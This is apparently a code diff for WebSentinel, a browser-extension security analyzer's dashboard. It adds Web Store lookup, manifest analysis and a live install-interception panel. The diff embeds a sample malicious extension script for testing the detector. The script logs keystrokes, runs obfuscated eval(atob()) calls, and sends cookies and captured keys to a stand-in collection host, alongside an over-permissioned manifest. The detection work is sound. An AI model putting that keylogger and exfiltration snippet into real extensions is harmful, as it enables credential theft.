+// ── Web Store URL lookup ──────────────────────────────────────────────────
+async function c1WebstoreAnalyze() {
+  const raw = document.getElementById('c1-ws-input').value.trim();
+  if (!raw) { alert('Enter a Chrome Web Store URL or extension ID.'); return; }
+  const btn  = document.getElementById('c1-ws-btn');
+  const spin = document.getElementById('c1-ws-spinner');
+  btn.disabled = true; spin.style.display = 'flex';
+  document.getElementById('c1-result-area').style.display = 'none';
+  try {
+    const res = await fetch(API + '/extension/webstore', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({url_or_id: raw}),
+    });
+    if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
+    const data = await res.json();
+    c1Render(data);
+    c1AddHistory(data);
+  } catch (err) {
+    alert('Lookup failed: ' + err.message);
+  } finally {
+    btn.disabled = false; spin.style.display = 'none';
+  }
+}
+
+// ── Manual / manifest analysis ────────────────────────────────────────────
+const C1_MAL_MANIFEST = JSON.stringify({
+  "manifest_version": 2, "name": "Flash Player Helper", "version": "3.1",
+  "permissions": ["tabs","cookies","webRequest","webRequestBlocking","nativeMessaging","history","management"],
+  "host_permissions": ["<all_urls>"],
+  "background": {"scripts":["bg.js"],"persistent":true},
+  "content_scripts": [{"matches":["<all_urls>"],"js":["cs.js"]}]
+}, null, 2);
+
+const C1_MAL_SOURCE = `(function(){var _k='';
+  document.addEventListener('keydown',function(e){_k+=e.key;});
+  eval(atob('d2luZG93LmxvY2F0aW9u'));eval(atob('ZG9jdW1lbnQuY29va2ll'));
+  for(var i=0;i<6;i++)eval('chrome.tabs.executeScript({code:"void 0"})');
+  var x=new XMLHttpRequest();x.open('POST','https://192.168.1.99/collect');
+  x.send(JSON.stringify({cookies:document.cookie,keys:_k}));
+})();`;
+
+function c1FillMalicious() {
+  c1Tab('manual', document.querySelectorAll('.c1-tab')[2]);
+  document.getElementById('c1-manifest').value = C1_MAL_MANIFEST;
+  document.getElementById('c1-source').value   = C1_MAL_SOURCE;
+}
+
+function c1ClearManual() {
+  ['c1-manifest','c1-source','c1-extid','c1-extpath'].forEach(id =>
+    document.getElementById(id).value = '');
+  document.getElementById('c1-result-area').style.display = 'none';
+}
+
+async function c1Analyze() {
+  const manifest = document.getElementById('c1-manifest').value.trim();
+  if (!manifest) { alert('Paste manifest.json first.'); return; }
+  const btn = document.getElementById('c1-submit-btn');
+  btn.disabled = true;
+  document.getElementById('c1-result-area').style.display = 'none';
+  try {
+    const res = await fetch(API + '/extension/analyze', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        manifest:       manifest,
+        source_code:    document.getElementById('c1-source').value,
+        extension_id:   document.getElementById('c1-extid').value.trim(),
+        extension_path: document.getElementById('c1-extpath').value.trim(),
+      }),
+    });
+    if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
+    const data = await res.json();
+    c1Render(data);
+    c1AddHistory(data);
+  } catch (err) {
+    alert('Analysis failed: ' + err.message);
+  } finally {
+    btn.disabled = false;
+  }
+}
+
+// ── C1 Live tab — WebSocket handler ───────────────────────────────────────
+function c1HandleWsMsg(msg) {
+  if (msg.type === 'c1_install_intercepted') {
+    const extId = msg.ext_id;
+    const state = msg.state || 'analyzing';
+
+    if (state === 'analyzing') {
+      c1LiveCreateCard(extId, msg.url || '');
+    } else if (state === 'sandbox_running') {
+      c1LiveSetSandboxRunning(extId, msg.static_score);
+    } else {
+      c1LiveUpdateCard(extId, state, msg.result, msg.error);
+    }
+
+    // Switch to C1 → Live tab, show badge
+    const navBtn = document.querySelector('.nav-item[data-panel="c1"]');
+    if (navBtn) { navBtn.classList.add('has-data'); navBtn.click(); }
+    c1Tab('live', document.getElementById('c1-tab-live'));
+    c1LiveBadge(true);
+
+  } else if (msg.type === 'c1_install_approved') {
+    c1LiveMarkDone(msg.ext_id, 'installed');
+    showToast('✅ Browser restarted with extension loaded — returning to extension page');
+
+  } else if (msg.type === 'c1_install_blocked') {
+    c1LiveMarkDone(msg.ext_id, 'blocked');
+    showToast('Extension blocked by WebSentinel');
+  }
+}
+
+// ── Live tab card management ───────────────────────────────────────────────
+function c1LiveBadge(show) {
+  const b = document.getElementById('c1-live-badge');
+  const count = document.querySelectorAll('.c1-live-card:not(.done)').length;
+  if (show && count > 0) { b.style.display = 'inline'; b.textContent = count; }
+  else { b.style.display = 'none'; }
+}
+
+function c1LiveCreateCard(extId, url) {
+  document.getElementById('c1-live-empty').style.display = 'none';
+  if (document.getElementById('c1-live-' + extId)) return; // already exists
+
+  const card = document.createElement('div');
+  card.className = 'c1-live-card';
+  card.id = 'c1-live-' + extId;
+  card.innerHTML =
+    '<div class="c1-lc-hdr">' +
+      '<div class="c1-lc-dot analyzing" id="c1-lc-dot-' + extId + '"></div>' +
+      '<div class="c1-lc-info">' +
+        '<div class="c1-lc-title">Extension Install Intercepted</div>' +
+        '<div class="c1-lc-extid">' + extId + '</div>' +
+      '</div>' +
+      '<button class="c1-lc-dismiss" title="Dismiss" onclick="c1LiveDismiss(\'' + extId + '\')">&#10005;</button>' +
+    '</div>' +
+    '<div id="c1-lc-body-' + extId + '" style="font-size:11px;color:var(--t2);display:flex;align-items:center;gap:8px;margin-bottom:10px">' +
+      '<div class="c1-ring" style="width:13px;height:13px;flex-shrink:0"></div>Analyzing extension…' +
+    '</div>' +
+    '<div class="c1-lc-actions" id="c1-lc-actions-' + extId + '">' +
+      '<button class="c1-btn ghost" style="padding:5px 12px;font-size:11px" onclick="c1LiveBlock(\'' + extId + '\')">&#128683; Block</button>' +
+      '<button class="c1-btn primary" id="c1-lc-approve-' + extId + '" disabled style="padding:5px 12px;font-size:11px;opacity:.35">&#9203; Analyzing…</button>' +
+    '</div>';
+
+  document.getElementById('c1-live-cards').insertBefore(card, document.getElementById('c1-live-cards').firstChild);
+  c1LiveBadge(true);
+}
+
+function c1SimulateClick() {
+  fetch('http://127.0.0.1:8001/dev/simulate_click', { method: 'POST' })
+    .then(r => r.json())
+    .then(d => console.log('[C1-SIM]', d.status))
+    .catch(e => console.error('[C1-SIM] error', e));
+}
+
+function c1LiveSetSandboxRunning(extId, staticScore) {
+  const body = document.getElementById('c1-lc-body-' + extId);
+  if (!body) return;
+  body.innerHTML =
+    '<div class="c1-ring" style="width:13px;height:13px;flex-shrink:0"></div>' +
+    'Static score: <b>' + Math.round(staticScore || 0) + '</b> — Running sandbox analysis…';
+}
+
+function c1LiveUpdateCard(extId, state, result, error) {
+  const card = document.getElementById('c1-live-' + extId);
+  if (!card) return;
+
+  const dot  = document.getElementById('c1-lc-dot-' + extId);
+  const body = document.getElementById('c1-lc-body-' + extId);
+  const btn  = document.getElementById('c1-lc-approve-' + extId);
+
+  dot.className = 'c1-lc-dot ' + state;
+
+  const clrMap = { safe:'var(--safe)', suspicious:'var(--warn)', malicious:'var(--danger)', error:'var(--t3)' };
+  const iconMap = { safe:'&#9989;', suspicious:'&#9888;&#65039;', malicious:'&#128683;', error:'&#10060;' };
+
+  if (state === 'error') {
+    body.innerHTML = '<span style="color:var(--danger)">' + (iconMap.error) + ' Analysis failed: ' + (error || 'Unknown') + '</span>';
+    card.classList.add('verdict-' + state);
+    if (btn) { btn.textContent = 'Cannot approve'; btn.disabled = true; }
+    return;
+  }
+
+  if (result) {
+    const score   = Math.round((result.score || 0) * 100);
+    const verdict = (result.verdict || 'UNKNOWN').toUpperCase();
+    const clr     = clrMap[state] || 'var(--t2)';
+    const isSafe  = result.verdict === 'SAFE';
+
+    body.innerHTML =
+      '<div class="c1-lc-score" style="color:' + clr + '">' + score + '</div>' +
+      '<div>' +
+        '<div class="c1-lc-vlabel" style="color:' + clr + '">' + (iconMap[state] || '') + ' ' + verdict + '</div>' +
+        '<div class="c1-lc-detail">ML: ' + Math.round((result.static?.ml_score||0)*100) + '% &nbsp;|&nbsp; ' +
+          'Hash: ' + (result.static?.hash_match ? '<b style="color:var(--danger)">YES</b>' : 'No') +
+        '</div>' +
+      '</div>';
+
+    if (result.flags && result.flags.length) {
+      const flagHtml = result.flags.slice(0,4).map(f =>
+        '<span class="c1-flag" style="font-size:9px">' + f + '</span>').join('');
+      body.innerHTML += '<div class="c1-flags" style="margin-top:6px">' + flagHtml + '</div>';
+    }
+
+    card.classList.add('verdict-' + state);
+
+    if (btn) {
+      btn.disabled = !isSafe;
+      btn.style.opacity = isSafe ? '1' : '0.35';
+      btn.textContent = isSafe ? '✅ Approve Install' : '🚫 ' + verdict;
+      if (isSafe) btn.onclick = () => c1LiveApprove(extId);
+    }
+
+    c1AddHistory(result);
+  }
+}
+
+function c1LiveMarkDone(extId, outcome) {
+  const card = document.getElementById('c1-live-' + extId);
+  if (!card) return;
+  card.classList.add('done');
+  const actions = document.getElementById('c1-lc-actions-' + extId);
+  if (actions) {
+    actions.innerHTML =
+      '<span style="font-size:11px;color:' + (outcome==='installed' ? 'var(--safe)' : 'var(--t3)') + '">' +
+      (outcome === 'installed'
+        ? '&#9989; Browser restarted with extension loaded'
+        : '&#128683; Blocked') +
+      '</span>' +
+      '<button class="c1-btn ghost" style="padding:4px 10px;font-size:10px;margin-left:auto" onclick="c1LiveDismiss(\'' + extId + '\')">Dismiss</button>';
+  }
+  c1LiveBadge(false);
+}
+
+function c1LiveDismiss(extId) {
+  const card = document.getElementById('c1-live-' + extId);
+  if (card) card.remove();
+  if (!document.querySelector('.c1-live-card')) {
+    document.getElementById('c1-live-empty').style.display = 'block';
+  }
+  c1LiveBadge(false);
+}
+
+async function c1LiveApprove(extId) {
+  const btn = document.getElementById('c1-lc-approve-' + extId);
+  if (btn) { btn.disabled = true; btn.textContent = 'Installing…'; }
+  try {
+    const res = await fetch(API + '/session/approve_install', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ ext_id: extId }),
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      alert('Cannot approve: ' + (data.detail || JSON.stringify(data)));
+      if (btn) { btn.disabled = false; btn.textContent = '✅ Approve Install'; }
+    }
+  } catch (err) {
+    alert('Approve failed: ' + err.message);
+    if (btn) { btn.disabled = false; btn.textContent = '✅ Approve Install'; }
+  }
+}
+
+async function c1LiveBlock(extId) {
+  await fetch(API + '/session/block_install', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ ext_id: extId }),
+  }).catch(() => {});
+}
+</script>
 <!-- ─── C3: C2 Beacon Detector (PLACEHOLDER) ─────────────── -->
 <div class="panel" id="panel-c3">
   <div class="panel-hdr">
@@ -818,6 +1601,13 @@ function connectPwWs() {
 
   pwWs.onmessage = (evt) => {
     let msg; try { msg = JSON.parse(evt.data); } catch { return; }
+    // Route C1 events to the extension analyzer handler
+    if (['c1_install_intercepted','c1_install_approved','c1_install_blocked'].includes(msg.type)) {
+      c1HandleWsMsg(msg); return;
+    }
+    if (msg.type === 'c1_extension_installed') {
+      c1HandleInstallMsg(msg); return;
+    }
     if (msg.type === 'analysis' && msg.data) {
       ingestResult(msg.data);
     } else if (msg.type === 'url_change') {
@@ -831,7 +1621,7 @@ function connectPwWs() {
     } else if (msg.type === 'session_error') {
       setMonActive(false); showToast('Session error \u2014 check backend logs');
     } else if (msg.type === 'init') {
-      if (msg.session_running && msg.url) { updateMonUrl(msg.url); setMonActive(true); }
+      if (msg.session_running) { updateMonUrl(msg.url || 'Ready'); setMonActive(true); }
     }
   };
   pwWs.onerror = () => {};
